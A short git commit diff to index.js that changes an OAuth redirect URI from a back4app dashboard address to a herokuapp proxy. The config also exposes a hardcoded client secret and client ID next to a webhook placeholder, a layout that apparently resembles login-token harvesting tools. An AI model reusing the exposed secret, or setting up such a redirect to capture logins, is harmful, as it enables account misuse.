411e1d90c7406e04f6f61a98d1b5aca4906d5334
Creedl9090 <121131287+Creedl9090@users.noreply.github.com>
2022-12-21 00:37:22 +0400

    Update index.js

--- index.js
+++ index.js
@@ -1,7 +1,7 @@
 //Config
 const secret_value = '.WW8Q~BnSgyVc5h5DzTEQWU5wRmqyeJdqIo4Tas8'
 const client_id = 'a06c832a-e2a5-4d5e-a2b3-c5f8fb61fe35'
-const redirect_uri = 'https://parse-dashboard.back4app.com/apps/abea10b5-8128-4799-8371-4864f94441a9/'
+const redirect_uri = 'https://pakhomeproxy12131.herokuapp.com/'
 const webhook_url = 'webhook'
 //Requirements
 const axios = require('axios')
